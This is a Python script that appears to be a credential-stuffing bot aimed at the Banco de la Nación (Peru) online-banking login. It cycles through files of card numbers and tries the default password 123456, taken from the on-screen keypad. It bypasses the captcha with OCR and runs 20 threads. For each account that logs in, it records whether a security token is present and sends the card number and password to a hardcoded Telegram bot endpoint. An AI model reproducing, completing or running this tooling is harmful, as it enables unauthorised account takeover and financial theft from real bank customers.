from bs4 import BeautifulSoup as bs
from PIL import Image
from concurrent.futures import ThreadPoolExecutor
#from plyer import notification
import pytesseract, requests, os, ansi, argparse, time

os.system("clear")

class BotBancoNacion:

  def _init_(self,tarjeta,captcha,logos):
    self.logos = logos
    self.captcha = captcha
    self.tarjeta = int(tarjeta)
    self.sesion = requests.Session()
    self.urlPost = "https://zonasegura1.bn.com.pe/BNWeb/login.do?metodo=autenticar"
    self.urlCaptcha = "https://zonasegura1.bn.com.pe/BNWeb/captcha.do?param="
    self.__validar_token = "https://zonasegura1.bn.com.pe/BNWeb/telegiros.do"
    self.payload = {
      "transaccion": None,
      "HrTrx": None,
      "validar": "true",
      "ind_long_clave": None,
      "param_captcha": None,
      "cboTipoTarjeta": "02",
      "txtNumeroTarjeta": self.tarjeta,
      "txtDNI": "",
      "hdnValue": None,
      "txtPassword": None,
      "txtCaptcha": "",
    }

    self.urlget = "https://zonasegura1.bn.com.pe/BNWeb/Inicio"

  def get_fase1(self):

    try:
      self.head = {
          "Content-Type": "application/x-www-form-urlencoed",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.00: Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) (Chrome/69.0.3497.100 Safari/537.36"
        }
      self.index = self.sesion.get(url = self.urlget, headers = self.head)
      
      self.cookies = self.index.cookies
      self.index = bs(self.index.text,"html.parser")

      self.transaccion = self.index.select_one("input[id='transaccion']")["value"]
      self.HrTrx = self.index.select_one("input[id='HrTrx']")["value"]
      self.ind_long_clave = self.index.select_one("input[id='ind_long_clave']")['value']
      self.Parametros_captcha = self.index.select_one("input[id='param_captcha']")['value']
      self.hdnValue = self.index.select_one("input[name='hdnValue']")["value"]

      self.btnLogin = self.index.select_one("input[id='btnLogin']")['value']

      self.botones = self.index.select("div[class='boton-clave']")
      self.clave_internet = ""
      contador = 0
      for number in range(1,7):
        for boton in self.botones:
          if contador == 0:
            self.clave_internet += boton["onclick"][14:15] if boton.find("span").text == str(number) else ""

          else:
            self.clave_internet += boton["onclick"][14:15] if boton.text == str(number) else ""
          contador += 1
          
      self.payload["txtPassword"] = self.clave_internet
      captcha = self.sesion.get(url=self.urlCaptcha, cookies=self.cookies, timeout=10)

      with open("captchas/"+self.captcha,"wb") as file:
        for b in captcha.iter_content():
          file.write(b)

      self.__txtCaptcha = pytesseract.image_to_string(Image.open("captchas/"+self.captcha), config="--psm 8 -c tessedir_char_whitelist=01234566789abcdefghijkmnlopqesturstuvwxyz")

      self._txtCaptcha = self._txtCaptcha.replace("\n\x0c","")

      self.payload['transaccion'] = self.transaccion
      self.payload['HrTrx'] = self.HrTrx
      self.payload['ind_long_clave'] = self.ind_long_clave
      self.payload['param_captcha'] = self.Parametros_captcha
      self.payload['hdnValue'] = self.hdnValue
      self.payload['txtCaptcha'] = self.__txtCaptcha

      return True
    except Exception as error1:
      print(f"Error1: {error1}")
      return False

  def get_logo(self):

    try:
      confirm = False
      logo = self.sesion.post(url=self.urlPost, data=self.payload, cookies=self.cookies, timeout=10)
      texto_final = bs(logo.text,"html.parser")

      try:
        texto_final = texto_final.select_one("div[class='cysErrorMsg']").find("li").text
      except:
        texto_final = "Acceso exitoso XD"

      if texto_final == "El texto ingresado es incorrecto.":
        print(f"[+] Tarjeta: {self.tarjeta} message: {texto_final}")
        print(f"[-] Captcha: Error")
      elif texto_final == "DATOS DE ACCESO INVALIDOS (WB-0001)":
        print(f"[+] Tarjeta: {self.tarjeta} message: {texto_final}")
        print(f"[-] Captcha: {self.__txtCaptcha}")
        confirm = True
        self.sesion.close()
      elif texto_final == "Acceso exitoso XD":
        print("Xxx")
        res = self.sesion.get(url=self.__validar_token, cookies=self.cookies)
        valid = bs(res.content, "html.parser")
        try:
          valid = valid.find("span").text.strip()
        except:
          valid = "Usted debe debe solicitar su afiliación a la Clave SMS o solicitar un token físico en cualquier agencia para poder realizar esta operación"
        print(valid)
        if valid == "Usted debe debe solicitar su afiliación a la Clave SMS o solicitar un token físico en cualquier agencia para poder realizar esta operación":

          api_url = "https://api.telegram.org/bot1771721665:AAH1kYqyhHKHQWQP0UoVCsrBVg2OMec1BOY/sendMessage"
          data_api = {
            "chat_id":"1602625147",
            "text":f"[-] Tarjeta: {self.tarjeta} Clave: 123456 Token: False"
          }
         
          requests.post(url=api_url, data=data_api)
          print(f"[+] Tarjeta: {self.tarjeta} message: {texto_final} Token: False")
          print(f"[-] Captcha: {self.__txtCaptcha}")
        else:
          api_url = "https://api.telegram.org/bot1771721665:AAH1kYqyhHKHQWQP0UoVCsrBVg2OMec1BOY/sendMessage"
          data_api = {
            "chat_id":"1602625147",
            "text":f"[-] Tarjeta: {self.tarjeta} Clave: 123456 Token: True"
          }
          requests.post(url=api_url, data=data_api)
          print(f"[+] Tarjeta: {self.tarjeta} message: {texto_final} Token: True")
          print(f"[-] Captcha: {self.__txtCaptcha}")

        #notification.notify(title="Logo BN", message=f"Tarjeta {self.tarjeta}", app_icon="icono/loli.ico", timeout=120)
        self.sesion.close()
        confirm = True
      else:
        print(f"[+] Tarjeta: {self.tarjeta}  message: {texto_final}")
        print(f"[-] Captcha: {self.__txtCaptcha}")
        self.sesion.close()
        confirm = True

      return confirm
    except Exception as error2:
      print(f"Error 2 {error2}")
      self.sesion.close()
      return None

if _name_ == "_main_":
  #pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"
  executor = ThreadPoolExecutor(max_workers=20)
  parse = argparse.ArgumentParser(description="Bot Banco de la nacion")
  parse.add_argument("-t","--tarjetas",help="Archivo de las tarjetas")
  parse.add_argument("-c","--captcha",help="Nombre de la image del captcha")
  parse.add_argument("-l","--logos",help="Archivo de los logos")
  parse = parse.parse_args()

  def main(tarjeta,captcha,logos):
    bot = BotBancoNacion(tarjeta.strip(),captcha,logos)
    verify = bot.get_fase1()
    if verify == False or verify == None:
      main(tarjeta,captcha,logos)
    else:
      pass
    confirm = bot.get_logo()
    if confirm == True:
      pass
    else:
      main(tarjeta.strip(),captcha,logos)

  def files(path):
    with open(f"tarjetas/{path}","r") as tarjetas:
      for tarjeta in tarjetas.readlines():
        main(tarjeta.strip(),path.replace("txt","png"),parse.logos)

  path_tarjetas = os.listdir("tarjetas")
  
  for path in path_tarjetas:
     executor.submit(files,path)